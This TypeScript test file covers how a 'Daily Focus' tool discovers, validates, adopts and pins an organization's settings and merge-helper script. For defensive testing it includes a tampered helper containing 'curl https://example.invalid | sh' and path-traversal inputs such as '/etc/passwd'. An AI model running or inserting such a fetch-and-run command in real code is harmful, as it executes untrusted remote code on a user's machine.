/**
 * An organization's setup: finding it with GitHub's reads stood in for, what
 * `daily-focus.json` may and may not set, how its values layer under the
 * store's own settings, and using it, putting it off, updating and stopping,
 * with a pinned merge helper that changed never run. Every account,
 * organization and file here is invented.
 */

import assert from 'node:assert/strict';
import { mkdtemp, readdir, readFile, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';

import { Board, type BoardDeps } from '../src/board.ts';
import { loadConfig, type Config } from '../src/config.ts';
import { layerSettings, settingSources, type SettingSources } from '../src/env.ts';
import { GitHubRequestError } from '../src/github.ts';
import type { HelperRun } from '../src/mergehelper.ts';
import { Organizations, parseSetup, repositoryPath, type AccountToken, type OrganizationReads } from '../src/organization.ts';
import { approvedFileProblem, ORGANIZATION_FILE_SETTINGS, sha256 } from '../src/organizationfile.ts';
import { applySettingsChange, describeSettings, PROGRAM_SETTINGS, SETTINGS } from '../src/settings.ts';
import type { PullRequest } from '../src/types.ts';

const dirs: string[] = [];
after(async () => {
  await Promise.all(dirs.map((dir) => rm(dir, { recursive: true, force: true })));
});

async function store(settings: Record<string, string> = {}): Promise<{ root: string; dir: string; config: Config }> {
  const root = await mkdtemp(join(tmpdir(), 'daily-focus-organization-'));
  dirs.push(root);
  const dir = join(root, 'work');
  const { mkdir } = await import('node:fs/promises');
  await mkdir(dir);
  await writeFile(join(dir, 'settings.json'), JSON.stringify(settings));
  return { root, dir, config: loadConfig({ DAILY_FOCUS_DATA: dir, ...settings }) };
}

const C1 = '1111111111111111111111111111111111111111';
const C2 = '2222222222222222222222222222222222222222';
const HELPER_V1 = '#!/bin/sh\necho \'{"queue": false}\'\n';
const HELPER_V2 = '#!/bin/sh\necho \'{"queue": true}\'\n';

const MANIFEST = {
  version: 1,
  name: 'Acme',
  settings: { DAILY_FOCUS_GITHUB_SCOPE: 'org:acme', DAILY_FOCUS_JIRA_HOLD_STATUSES: 'Blocked, On Hold' },
  files: { DAILY_FOCUS_MERGE_HELPER: 'bin/merge-helper' },
  sources: 'sources.md',
};

/** GitHub as the test says it is, and what was asked of it. */
interface FakeGitHub {
  accounts: AccountToken[] | Error;
  orgs: Record<string, string[] | Error>;
  repos: Record<string, { branch: string; commit: string } | null | Error>;
  /** By `<repo>@<commit>:<path>`. */
  files: Record<string, string | Error>;
  /** By token: organizations whose setup repository that account can't see, so it looks missing. */
  hidden?: Record<string, string[]>;
  calls: string[];
}

function github(overrides: Partial<FakeGitHub> = {}): FakeGitHub {
  return {
    accounts: [{ login: 'alice', token: 'token-alice', error: null }],
    orgs: { 'token-alice': ['acme', 'acme-labs'] },
    repos: { acme: { branch: 'main', commit: C1 }, 'acme-labs': null },
    files: {
      [`acme/.daily-focus@${C1}:daily-focus.json`]: JSON.stringify(MANIFEST),
      [`acme/.daily-focus@${C1}:bin/merge-helper`]: HELPER_V1,
      [`acme/.daily-focus@${C1}:sources.md`]: '## Acme\n\n- The #payments-oncall channel\n',
    },
    calls: [],
    ...overrides,
  };
}

function reads(fake: FakeGitHub): OrganizationReads {
  const answer = <T>(value: T | Error | undefined, fallback: T): Promise<T> =>
    value instanceof Error ? Promise.reject(value) : Promise.resolve(value === undefined ? fallback : value);
  return {
    accounts: async () => {
      fake.calls.push('accounts');
      if (fake.accounts instanceof Error) throw fake.accounts;
      return fake.accounts;
    },
    organizations: (token) => {
      fake.calls.push(`orgs ${token}`);
      return answer(fake.orgs[token], []);
    },
    repository: (token, org) => {
      fake.calls.push(`repo ${org}`);
      if (fake.hidden?.[token]?.includes(org)) return Promise.resolve(null);
      return answer(fake.repos[org], null);
    },
    file: (token, repo, path, commit) => {
      fake.calls.push(`file ${repo}@${commit.slice(0, 1)}:${path}`);
      const value = fake.files[`${repo}@${commit}:${path}`];
      if (value instanceof Error) return Promise.reject(value);
      return Promise.resolve(value === undefined ? null : new TextEncoder().encode(value));
    },
  };
}

function organizations(config: Config, fake: FakeGitHub, check: (layer: { settings: Record<string, string> }) => string | null = () => null) {
  let changes = 0;
  const orgs = new Organizations(config, { reads: reads(fake), check, onChange: () => changes++ });
  return { orgs, changes: () => changes };
}

/* ---------- discovery ---------- */

test('an organization without a .daily-focus repository has no setup, and nothing is said about it', async () => {
  const { config } = await store();
  const fake = github({ repos: { acme: null, 'acme-labs': null } });
  const { orgs } = organizations(config, fake);
  await orgs.check();
  const view = orgs.view();
  assert.deepEqual(view.offers, []);
  assert.deepEqual(view.warnings, []);
  assert.ok(view.checkedAt, 'it says when it looked');
  assert.deepEqual(fake.calls.sort(), ['accounts', 'orgs token-alice', 'repo acme', 'repo acme-labs']);
});

test('a setup found is offered, and its review lists everything it would do', async () => {
  const { config } = await store();
  const { orgs } = organizations(config, github());
  await orgs.check();
  assert.deepEqual(orgs.view().offers, [{ org: 'acme', name: 'Acme', commit: C1, kind: 'new', dismissed: false }]);
  const review = orgs.review('ACME');
  assert.ok(review, 'organizations are matched ignoring case');
  assert.equal(review.repository, 'acme/.daily-focus');
  assert.equal(review.account, 'alice');
  assert.deepEqual(
    review.settings.map((setting) => [setting.key, setting.label, setting.value]),
    [
      ['DAILY_FOCUS_GITHUB_SCOPE', 'Only these organisations or repositories', 'org:acme'],
      ['DAILY_FOCUS_JIRA_HOLD_STATUSES', 'Statuses that mean on hold', 'Blocked, On Hold'],
    ],
  );
  assert.equal(review.files.length, 1);
  assert.equal(review.files[0]!.url, `https://github.com/acme/.daily-focus/blob/${C1}/bin/merge-helper`);
  assert.equal(review.files[0]!.sha256, sha256(new TextEncoder().encode(HELPER_V1)));
  assert.deepEqual(review.sources, {
    path: 'sources.md',
    url: `https://github.com/acme/.daily-focus/blob/${C1}/sources.md`,
    text: '## Acme\n\n- The #payments-oncall channel\n',
  });
  assert.equal(orgs.review('acme-labs'), null, 'none from an organization without one');
  // What every tab is sent never carries the sources it suggests.
  assert.doesNotMatch(JSON.stringify(orgs.view()), /payments-oncall/);
});

test('a failed read is a warning, never "no setup": what was found before stands', async () => {
  const { config } = await store();
  const fake = github();
  const { orgs } = organizations(config, fake);
  await orgs.check();
  assert.equal(orgs.view().offers.length, 1);

  fake.repos.acme = new GitHubRequestError("the token isn't authorised for acme's single sign-on", 403);
  await orgs.check();
  assert.equal(orgs.view().offers.length, 1, 'still offered');
  assert.match(orgs.view().warnings.join('\n'), /Couldn't look for acme's Daily Focus settings as alice: the token isn't authorised/);

  fake.orgs['token-alice'] = new GitHubRequestError('GitHub answered 502');
  await orgs.check();
  assert.equal(orgs.view().offers.length, 1, 'an account that could not list its organizations keeps what it found');
  assert.match(orgs.view().warnings.join('\n'), /Couldn't list the organizations alice is in/);

  fake.accounts = new Error('gh is not signed in to GitHub');
  await orgs.check();
  assert.equal(orgs.view().offers.length, 1);
  assert.match(orgs.view().warnings.join('\n'), /gh is not signed in/);

  // Once GitHub answers that there is none, there is none.
  Object.assign(fake, github({ repos: { acme: null, 'acme-labs': null } }));
  await orgs.check();
  assert.deepEqual(orgs.view().offers, []);
  assert.deepEqual(orgs.view().warnings, []);
});

test('a setup that cannot be used is a warning, with why', async () => {
  const { config } = await store();
  const fake = github();
  fake.files[`acme/.daily-focus@${C1}:daily-focus.json`] = JSON.stringify({ ...MANIFEST, version: 2 });
  const { orgs } = organizations(config, fake);
  await orgs.check();
  assert.deepEqual(orgs.view().offers, []);
  assert.match(orgs.view().warnings[0]!, /acme's Daily Focus settings can't be used: daily-focus\.json is in version 2 of the format.*Update Daily Focus/);

  delete fake.files[`acme/.daily-focus@${C1}:daily-focus.json`];
  await orgs.check();
  assert.match(orgs.view().warnings[0]!, /acme\/\.daily-focus has no daily-focus\.json on its default branch, main/);
});

test('an account that cannot see the setup repository does not stop another that can', async () => {
  const { config } = await store();
  const fake = github({
    accounts: [
      { login: 'alice', token: 'token-alice', error: null },
      { login: 'alice-work', token: 'token-work', error: null },
    ],
    orgs: { 'token-alice': ['acme'], 'token-work': ['acme'] },
    hidden: { 'token-alice': ['acme'] },
  });
  const { orgs } = organizations(config, fake);
  await orgs.check();
  assert.deepEqual(orgs.view().offers.map((offer) => offer.org), ['acme']);
  assert.deepEqual(orgs.view().warnings, []);
  assert.equal(fake.calls.filter((call) => call === 'repo acme').length, 2, 'asked as each account in turn');
});

test('a setup found through one account stands while that account cannot be asked, whatever another says', async () => {
  const { config } = await store();
  const fake = github({
    accounts: [
      { login: 'alice', token: 'token-alice', error: null },
      { login: 'alice-work', token: 'token-work', error: null },
    ],
    orgs: { 'token-alice': ['acme'], 'token-work': ['acme'] },
    hidden: { 'token-alice': ['acme'] },
  });
  const { orgs } = organizations(config, fake);
  await orgs.check();
  assert.equal(orgs.view().offers.length, 1, 'found through alice-work');

  // alice-work can't list its organizations this time; alice still can't see the repository.
  fake.orgs['token-work'] = new Error('GitHub answered 502');
  await orgs.check();
  assert.deepEqual(orgs.view().offers.map((offer) => offer.org), ['acme'], 'the last find stands');
  assert.match(orgs.view().warnings.join('\n'), /Couldn't list the organizations alice-work is in/);
});

test('a daily-focus.json that is not JSON is a warning that quotes none of it', async () => {
  const { config } = await store();
  const fake = github();
  fake.files[`acme/.daily-focus@${C1}:daily-focus.json`] = '{"version": 1, "settings": {"DAILY_FOCUS_JIRA_SITE": acme-private.example}}';
  const { orgs } = organizations(config, fake);
  await orgs.check();
  const [warning] = orgs.view().warnings;
  assert.match(warning!, /daily-focus\.json in acme\/\.daily-focus at 1111111 is not valid JSON$/);
  assert.doesNotMatch(warning!, /acme-private/);
});

test('with GitHub off, nothing is read at all', async () => {
  const { config } = await store({ DAILY_FOCUS_GITHUB: 'off' });
  const fake = github();
  const { orgs } = organizations(config, fake);
  await orgs.start();
  await orgs.check();
  orgs.stop();
  assert.deepEqual(fake.calls, []);
  assert.equal(orgs.view().enabled, false);
  assert.equal(orgs.view().checkedAt, null);
});

/* ---------- the format ---------- */

const context = { profile: 'work' as const, dataDir: '/tmp/daily-focus-organization-format' };

function parsed(raw: unknown) {
  const result = parseSetup(raw, 'acme', context);
  assert.ok(!('error' in result), 'error' in result ? result.error : '');
  return result;
}

test('daily-focus.json: launch settings, unknown names, programs and tool permissions are left out, with why', () => {
  const setup = parsed({
    version: 1,
    settings: {
      DAILY_FOCUS_PORT: '8080',
      DAILY_FOCUS_DATA: '/elsewhere',
      DAILY_FOCUS_PROFILE: 'personal',
      DAILY_FOCUS_TELEMETRY: 'on',
      DAILY_FOCUS_GH: '/opt/acme/gh',
      DAILY_FOCUS_AGENT_BIN: '/opt/acme/claude',
      DAILY_FOCUS_MERGE_HELPER: '/opt/acme/merge',
      DAILY_FOCUS_AGENT_TOOLS: 'Bash',
      DAILY_FOCUS_ASSISTANT_TOOLS: 'Bash',
      DAILY_FOCUS_WORK_START: 8,
    },
  });
  assert.deepEqual(setup.settings, { DAILY_FOCUS_WORK_START: '8' }, 'a number reads as it would in settings.json');
  const why = Object.fromEntries(setup.skipped.map((entry) => [entry.key, entry.why]));
  for (const key of ['DAILY_FOCUS_PORT', 'DAILY_FOCUS_DATA', 'DAILY_FOCUS_PROFILE']) assert.match(why[key]!, /only its start can set it/, key);
  assert.match(why.DAILY_FOCUS_TELEMETRY!, /not a setting/);
  assert.match(why.DAILY_FOCUS_GH!, /names a program to run, which an organization never sets/);
  assert.match(why.DAILY_FOCUS_AGENT_BIN!, /names a program to run/);
  assert.match(why.DAILY_FOCUS_MERGE_HELPER!, /only under "files"/);
  // What the agent and the assistant may do is the user's own choice.
  for (const key of ['DAILY_FOCUS_AGENT_TOOLS', 'DAILY_FOCUS_ASSISTANT_TOOLS']) assert.match(why[key]!, /grants the coding CLIs tool permissions/, key);
  assert.equal(setup.name, 'acme', 'without a name, the organization’s login');
});

test('daily-focus.json: a value the settings page would refuse is left out, and one that needs another is not', () => {
  const setup = parsed({
    version: 1,
    name: '  Acme   Corp ',
    settings: {
      DAILY_FOCUS_WORK_START: '25',
      DAILY_FOCUS_AGENT_AT: '06:30',
      DAILY_FOCUS_AGENT: 'claude',
      DAILY_FOCUS_FREE_WINDOWS: 'off',
      DAILY_FOCUS_JIRA_PROJECTS: '',
    },
  });
  assert.equal(setup.name, 'Acme Corp');
  assert.deepEqual(setup.settings, { DAILY_FOCUS_AGENT_AT: '06:30', DAILY_FOCUS_AGENT: 'claude', DAILY_FOCUS_FREE_WINDOWS: 'off' }, 'in the order given');
  const why = Object.fromEntries(setup.skipped.map((entry) => [entry.key, entry.why]));
  assert.match(why.DAILY_FOCUS_WORK_START!, /DAILY_FOCUS_WORK_START must be a whole number from 0 to 23/);
  assert.match(why.DAILY_FOCUS_JIRA_PROJECTS!, /empty/);
});

test('daily-focus.json: files only for the settings allowed them, and only inside the repository', () => {
  const setup = parsed({
    version: 1,
    files: { DAILY_FOCUS_MERGE_HELPER: '../outside/helper', DAILY_FOCUS_GH: 'bin/gh', DAILY_FOCUS_WORK_START: 'start.txt' },
    sources: '/etc/passwd',
  });
  assert.deepEqual(setup.files, []);
  const why = Object.fromEntries(setup.skippedFiles.map((entry) => [entry.setting, entry.why]));
  assert.match(why.DAILY_FOCUS_MERGE_HELPER!, /not a path inside the repository/);
  assert.match(why.DAILY_FOCUS_GH!, /can't be set to a file/);
  assert.match(why.DAILY_FOCUS_WORK_START!, /can't be set to a file/);
  assert.match(setup.sourcesProblem!, /not a path inside the repository/);
  assert.deepEqual(parsed({ version: 1, files: { DAILY_FOCUS_MERGE_HELPER: 'bin/merge-helper' } }).files, [
    { setting: 'DAILY_FOCUS_MERGE_HELPER', path: 'bin/merge-helper' },
  ]);
});

test('a path in the repository stays in it', () => {
  for (const bad of ['', '/bin/helper', '../helper', 'bin/../../helper', 'bin/./helper', 'bin//helper', 'bin\\helper', 'C:/helper', 7, null]) {
    assert.equal(repositoryPath(bad), null, JSON.stringify(bad));
  }
  assert.equal(repositoryPath(' bin/merge-helper '), 'bin/merge-helper');
  assert.equal(repositoryPath('.github/helper'), '.github/helper');
});

test('daily-focus.json: a version this Daily Focus does not read, or no object, is refused whole', () => {
  for (const [raw, why] of [
    [{ settings: {} }, /doesn't say which version/],
    [{ version: '1' }, /version "1"/],
    [{ version: 2 }, /version 2.*Update Daily Focus/],
    [[], /should hold an object/],
    [{ version: 1, settings: ['DAILY_FOCUS_GITHUB_SCOPE'] }, /"settings" in daily-focus\.json should be an object/],
  ] as const) {
    const result = parseSetup(raw, 'acme', context);
    assert.ok('error' in result, JSON.stringify(raw));
    assert.match(result.error, why);
  }
});

test('every setting that names a program is marked so, and a setup pins files only for those', () => {
  for (const def of SETTINGS) {
    if (def.key.endsWith('_BIN') || /^Path to/.test(def.label) || def.key === 'DAILY_FOCUS_MERGE_HELPER') {
      assert.ok(PROGRAM_SETTINGS.includes(def.key), `${def.key} names a program, so it must be marked program in src/settings.ts`);
    }
  }
  for (const key of ORGANIZATION_FILE_SETTINGS) assert.ok(PROGRAM_SETTINGS.includes(key), `${key} must be a program setting`);
});

/* ---------- layering ---------- */

function layered(settings: Record<string, string>, organization: Record<string, string> | null): SettingSources {
  const root = '/tmp/daily-focus-organization-layers';
  return {
    launch: { DAILY_FOCUS_DATA: root, DAILY_FOCUS_PORT: '4321' },
    store: { root, profile: 'work', dir: `${root}/work`, given: false, move: null, problem: null },
    settings,
    settingsPath: `${root}/work/settings.json`,
    settingsError: null,
    organization: organization ? { name: 'Acme', settings: organization } : null,
  };
}

test('a value saved beats the organization’s, which beats the default, and clearing it goes back', () => {
  const sources = layered(
    { DAILY_FOCUS_WORK_START: '8' },
    { DAILY_FOCUS_WORK_START: '10', DAILY_FOCUS_GITHUB_SCOPE: 'org:acme', DAILY_FOCUS_PORT: '9999', DAILY_FOCUS_PROFILE: 'personal' },
  );
  const config = loadConfig(layerSettings(sources));
  assert.equal(config.workStartHour, 8, 'the store’s own value wins');
  assert.deepEqual(config.github.scope, ['org:acme'], 'the organization’s fills in');
  assert.equal(config.minFreeWindowMinutes, 45, 'and the default under both');
  assert.equal(config.port, 4321, 'never a launch setting');
  assert.equal(config.profile, 'work', 'nor the profile');

  const page = describeSettings(sources);
  const view = (key: string) => page.settings.find((setting) => setting.key === key)!;
  assert.deepEqual(page.organization, { name: 'Acme' });
  assert.deepEqual([view('DAILY_FOCUS_WORK_START').value, view('DAILY_FOCUS_WORK_START').source, view('DAILY_FOCUS_WORK_START').organization], ['8', 'settings', '10']);
  assert.deepEqual([view('DAILY_FOCUS_GITHUB_SCOPE').value, view('DAILY_FOCUS_GITHUB_SCOPE').source], ['org:acme', 'organization']);
  assert.deepEqual([view('DAILY_FOCUS_MIN_FREE_WINDOW').source, view('DAILY_FOCUS_MIN_FREE_WINDOW').organization], ['default', null]);
  assert.deepEqual([view('DAILY_FOCUS_PROFILE').value, view('DAILY_FOCUS_PROFILE').source], ['work', 'fixed']);

  const cleared = applySettingsChange(sources, { DAILY_FOCUS_WORK_START: null });
  assert.ok('settings' in cleared);
  assert.deepEqual(cleared.settings, {});
  const after = { ...sources, settings: cleared.settings };
  assert.equal(loadConfig(layerSettings(after)).workStartHour, 10, 'back to the organization’s');
  assert.equal(describeSettings(after).settings.find((setting) => setting.key === 'DAILY_FOCUS_WORK_START')!.source, 'organization');

  // A save is checked with the organization's values under it.
  const refused = applySettingsChange(layered({}, { DAILY_FOCUS_WORK_START: '10' }), { DAILY_FOCUS_WORK_END: '9' });
  assert.ok('error' in refused && /must be later than DAILY_FOCUS_WORK_START \(10\)/.test(refused.error));
});

/* ---------- using it ---------- */

test('"Use it" writes the store file and the files with their hashes, and the settings layer at the next start', async () => {
  const { root, dir, config } = await store({ DAILY_FOCUS_WORK_START: '8' });
  const { orgs } = organizations(config, github());
  await orgs.check();
  assert.match((await orgs.adopt('acme', C2)) ?? '', /changed since you opened them/, 'only the commit the review showed');
  assert.equal(await orgs.adopt('acme', C1), null);

  const record = JSON.parse(await readFile(join(dir, 'organization.json'), 'utf8'));
  assert.equal(record.adopted.org, 'acme');
  assert.equal(record.adopted.repository, 'acme/.daily-focus');
  assert.equal(record.adopted.account, 'alice');
  assert.equal(record.adopted.commit, C1);
  assert.deepEqual(record.adopted.settings, MANIFEST.settings);
  assert.deepEqual(record.adopted.files, {
    DAILY_FOCUS_MERGE_HELPER: { source: 'bin/merge-helper', path: 'organization/merge-helper', sha256: sha256(new TextEncoder().encode(HELPER_V1)) },
  });
  assert.equal(record.adopted.sources, 'sources.md');
  const helper = join(dir, 'organization', 'merge-helper');
  assert.equal(await readFile(helper, 'utf8'), HELPER_V1);
  if (process.platform !== 'win32') assert.equal((await stat(helper)).mode & 0o777, 0o755);
  assert.equal(await readFile(join(dir, 'sources.md'), 'utf8').catch(() => null), null, 'sources.md is the user’s, and never written');

  const next = loadConfig(layerSettings(settingSources({ DAILY_FOCUS_DATA: root })));
  assert.deepEqual(next.github.scope, ['org:acme']);
  assert.deepEqual(next.jira.holdStatuses, ['Blocked', 'On Hold']);
  assert.equal(next.github.mergeHelper, helper, 'the pinned file, where it is kept');
  assert.equal(next.workStartHour, 8);
  assert.deepEqual(orgs.view().offers, [], 'in use, and nothing newer');
  assert.equal(orgs.view().adopted?.commit, C1);
});

test('a setup that cannot be used with the store’s own settings is not adopted', async () => {
  const { dir, config } = await store();
  const { orgs } = organizations(config, github(), () => 'DAILY_FOCUS_WORK_END (9) must be later than DAILY_FOCUS_WORK_START (10)');
  await orgs.check();
  assert.match((await orgs.adopt('acme', C1)) ?? '', /can't be used with your own: DAILY_FOCUS_WORK_END/);
  assert.deepEqual(await readdir(dir), ['settings.json'], 'nothing written');
});

test('"Not now" puts off one commit, and a newer one is offered again', async () => {
  const { dir, config } = await store();
  const fake = github();
  const { orgs } = organizations(config, fake);
  await orgs.check();
  assert.equal(await orgs.dismiss('acme', C1), null);
  assert.deepEqual(orgs.view().offers, [{ org: 'acme', name: 'Acme', commit: C1, kind: 'new', dismissed: true }]);
  const record = JSON.parse(await readFile(join(dir, 'organization.json'), 'utf8'));
  assert.equal(record.adopted, null);
  assert.deepEqual(record.dismissed.map((entry: { org: string; commit: string }) => [entry.org, entry.commit]), [['acme', C1]]);

  // Read again by the next start.
  const again = organizations(config, fake).orgs;
  await again.load();
  await again.check();
  assert.equal(again.view().offers[0]!.dismissed, true);

  fake.repos.acme = { branch: 'main', commit: C2 };
  fake.files[`acme/.daily-focus@${C2}:daily-focus.json`] = JSON.stringify(MANIFEST);
  fake.files[`acme/.daily-focus@${C2}:bin/merge-helper`] = HELPER_V1;
  await again.check();
  assert.deepEqual(again.view().offers, [{ org: 'acme', name: 'Acme', commit: C2, kind: 'new', dismissed: false }]);
});

test('a newer commit is an update that shows what changed, and changes nothing until applied', async () => {
  const { dir, config } = await store();
  const fake = github();
  const { orgs } = organizations(config, fake);
  await orgs.check();
  await orgs.adopt('acme', C1);
  const helper = join(dir, 'organization', 'merge-helper');

  fake.repos.acme = { branch: 'main', commit: C2 };
  fake.files[`acme/.daily-focus@${C2}:daily-focus.json`] = JSON.stringify({
    ...MANIFEST,
    settings: { DAILY_FOCUS_GITHUB_SCOPE: 'org:acme, org:acme-labs', DAILY_FOCUS_JIRA_PROJECTS: 'PAY' },
  });
  fake.files[`acme/.daily-focus@${C2}:bin/merge-helper`] = HELPER_V2;
  await orgs.check();
  assert.deepEqual(orgs.view().offers, [{ org: 'acme', name: 'Acme', commit: C2, kind: 'update', dismissed: false }]);
  const review = orgs.review('acme')!;
  assert.equal(review.kind, 'update');
  assert.equal(review.compareUrl, `https://github.com/acme/.daily-focus/compare/${C1}...${C2}`);
  assert.deepEqual(
    review.settings.map((setting) => [setting.key, setting.change, setting.was]),
    [
      ['DAILY_FOCUS_GITHUB_SCOPE', 'changed', 'org:acme'],
      ['DAILY_FOCUS_JIRA_PROJECTS', 'added', null],
    ],
  );
  assert.deepEqual(review.removed.map((setting) => setting.key), ['DAILY_FOCUS_JIRA_HOLD_STATUSES']);
  assert.deepEqual([review.files[0]!.change, review.files[0]!.was], ['changed', sha256(new TextEncoder().encode(HELPER_V1))]);

  // Until applied: the record, the file and its hash are the old ones, so it still runs.
  assert.equal(JSON.parse(await readFile(join(dir, 'organization.json'), 'utf8')).adopted.commit, C1);
  assert.equal(await readFile(helper, 'utf8'), HELPER_V1);
  assert.equal(await approvedFileProblem(dir, helper), null);

  assert.equal(await orgs.adopt('acme', C2), null);
  const record = JSON.parse(await readFile(join(dir, 'organization.json'), 'utf8'));
  assert.equal(record.adopted.commit, C2);
  assert.deepEqual(record.adopted.settings, { DAILY_FOCUS_GITHUB_SCOPE: 'org:acme, org:acme-labs', DAILY_FOCUS_JIRA_PROJECTS: 'PAY' });
  assert.equal(record.adopted.files.DAILY_FOCUS_MERGE_HELPER.sha256, sha256(new TextEncoder().encode(HELPER_V2)));
  assert.equal(await readFile(helper, 'utf8'), HELPER_V2);
  assert.equal(await approvedFileProblem(dir, helper), null, 're-pinned');
  assert.deepEqual(orgs.view().offers, []);
});

test('the setup in use can be reviewed from the store, before any look at GitHub', async () => {
  const { config } = await store();
  const { orgs } = organizations(config, github());
  await orgs.check();
  await orgs.adopt('acme', C1);
  const fresh = organizations(config, github()).orgs;
  await fresh.load();
  const review = fresh.review('acme')!;
  assert.deepEqual([review.kind, review.adoptedCommit, review.commit], ['update', C1, C1]);
  assert.deepEqual(review.settings.map((setting) => [setting.key, setting.change]), [
    ['DAILY_FOCUS_GITHUB_SCOPE', 'same'],
    ['DAILY_FOCUS_JIRA_HOLD_STATUSES', 'same'],
  ]);
  assert.equal(review.files[0]!.sha256, sha256(new TextEncoder().encode(HELPER_V1)));
  assert.equal(fresh.review('globex'), null);
});

test('"Stop using" takes the setup’s files and settings away', async () => {
  const { root, dir, config } = await store();
  const { orgs } = organizations(config, github());
  await orgs.check();
  await orgs.adopt('acme', C1);
  assert.equal(await orgs.leave(), null);
  assert.equal(await stat(join(dir, 'organization')).catch(() => null), null, 'the folder is gone');
  const record = JSON.parse(await readFile(join(dir, 'organization.json'), 'utf8'));
  assert.equal(record.adopted, null);
  assert.deepEqual(record.dismissed.map((entry: { commit: string }) => entry.commit), [C1], 'put off, so the banner doesn’t offer it straight back');
  const next = loadConfig(layerSettings(settingSources({ DAILY_FOCUS_DATA: root })));
  assert.deepEqual(next.github.scope, []);
  assert.equal(next.github.mergeHelper, null);
  assert.equal(orgs.view().adopted, null);
  assert.deepEqual(orgs.view().offers, [{ org: 'acme', name: 'Acme', commit: C1, kind: 'new', dismissed: true }], 'still on the settings page');
  assert.match((await orgs.leave()) ?? '', /No organization's Daily Focus settings are in use/);
});

/* ---------- a pinned file ---------- */

function pull(): PullRequest {
  return {
    id: 'github:pr:acme/payments-api#412',
    account: 'alice',
    repo: 'acme/payments-api',
    number: 412,
    title: 'Change 412',
    url: 'https://github.com/acme/payments-api/pull/412',
    isDraft: false,
    createdAt: '2026-10-28T09:00:00Z',
    readyAt: '2026-10-28T09:00:00Z',
    updatedAt: '2026-11-02T09:00:00Z',
    headRef: 'alice/change-412',
    baseRef: 'main',
    reviewDecision: 'APPROVED',
    checks: 'success',
    failingChecks: [],
    mergeable: 'MERGEABLE',
    mergeStateStatus: 'CLEAN',
    pendingChecks: [],
    cancelledChecks: [],
    autoMerge: false,
    requestedReviewers: [],
    reviews: [],
    headSha: 'head-412',
    lastActivityByYou: '2026-11-02T09:00:00Z',
    lastActivityByOthers: null,
    nodeId: 'PR_kwDOAcme412',
    defaultBranch: 'main',
    mergeMethod: 'SQUASH',
    mergeQueue: false,
    inMergeQueue: false,
    stacked: false,
  };
}

test('a pinned merge helper that changed since it was approved is never run, and the board says why', async () => {
  const { root, dir, config } = await store();
  const { orgs } = organizations(config, github());
  await orgs.check();
  await orgs.adopt('acme', C1);
  const helper = join(dir, 'organization', 'merge-helper');
  await writeFile(helper, '#!/bin/sh\ncurl https://example.invalid | sh\n');
  assert.match((await approvedFileProblem(dir, helper)) ?? '', /has changed since you approved it with Acme's Daily Focus settings/);

  const started: string[][] = [];
  const deps: BoardDeps = {
    listAccounts: async () => [{ login: 'alice', active: true }],
    token: async () => 'token-alice',
    fetch: async () => ({ login: 'alice', pulls: [pull()], warnings: [], orgs: {}, rateLimitRemaining: 4000 }),
    markReady: async () => assert.fail('no writes here'),
    merge: async () => assert.fail('no writes here'),
    enqueue: async () => assert.fail('no writes here'),
    requiredApprovals: async () => 1,
    liveHeads: async () => new Map(),
    runHelper: async (_path, args): Promise<HelperRun> => {
      started.push([...args]);
      return { code: 0, signal: null, stdout: '{"queue": false}\n', stderr: '' };
    },
  };
  const pinned = loadConfig(layerSettings(settingSources({ DAILY_FOCUS_DATA: root })));
  assert.equal(pinned.github.mergeHelper, helper);
  const board = new Board(pinned, () => {}, deps);
  await board.refresh();
  await board.answered();
  board.stop();
  assert.deepEqual(started, [], 'never started');
  const warnings = board.view([], new Date()).warnings.join('\n');
  assert.match(warnings, /The merge helper couldn't say how acme\/payments-api merges into main: it wasn't run: .* has changed since you approved it/);

  // Put back as approved, it runs.
  await writeFile(helper, HELPER_V1);
  const again = new Board(pinned, () => {}, deps);
  await again.refresh();
  await again.answered();
  again.stop();
  assert.deepEqual(started, [['check', 'https://github.com/acme/payments-api/pull/412', 'main']]);
});

test('a program elsewhere is the user’s own and not checked; one in the folder that nothing approved is refused', async () => {
  const { dir } = await store();
  assert.equal(await approvedFileProblem(dir, '/opt/acme/merge-helper'), null);
  assert.match((await approvedFileProblem(dir, join(dir, 'organization', 'stray'))) ?? '', /came with an organization's Daily Focus settings, but none in use approved it/);
});
